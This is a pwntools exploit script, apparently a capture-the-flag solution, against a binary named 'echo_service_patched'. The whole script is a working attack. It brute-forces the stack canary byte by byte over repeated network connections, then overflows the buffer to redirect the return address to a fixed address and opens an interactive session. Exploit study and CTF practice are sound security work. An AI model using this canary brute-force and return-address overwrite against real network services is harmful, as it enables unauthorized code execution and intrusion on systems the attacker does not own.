#!/usr/bin/env python3

from pwn import *

exe = ELF("./echo_service_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    canary = b""
    #distance = 0x17
    r.recvuntil(b"port ")
    port = r.recvuntil(b" ")
    log.success(b"Found Port " + port)
    for j in range(8):
        for i in range(256):
            log.success("checking " + str(i))
            io = remote('0.0.0.0', int(port))
            print(b"sending " + b"A"*0x18 + canary + i.to_bytes(1, 'little'))
            io.send(b"A"*0x18 + canary + i.to_bytes(1, 'little'))
            io.recv()
            io.sendline("exit")
            io.close()
            sleep(1)
            line = r.recvuntil("stack smashing detected", timeout=5)
            print(line)
            if not b"stack smashing detected" in line:

                log.success("checking " + str(i))
                io = remote('0.0.0.0', int(port))
                print(b"sending " + b"A"*0x18 + canary + i.to_bytes(1, 'little'))
                io.send(b"A"*0x18 + canary + i.to_bytes(1, 'little'))
                io.recv()
                io.sendline("exit")
                sleep(1)
                line = r.recvuntil("stack smashing detected", timeout=5)
                if not b"stack smashing detected" in line:
                    canary += i.to_bytes(1, 'little')
                    log.success("Canary currently " + repr(canary))
                    io.close()
                    i = 0
                    break
                else:
                    i=0
                
            
            io.close()

    io = remote('0.0.0.0', int(port))
    ret_addr = 0x00401682
    io.send(b"A"*0x18 + canary + p64(ret_addr))
    r.recvuntil("stack smashing detected", timeout=5)
    io.recv()
    io.sendline("exit")
    sleep(1)
    io.close()
    r.interactive()


if __name__ == "__main__":
    main()
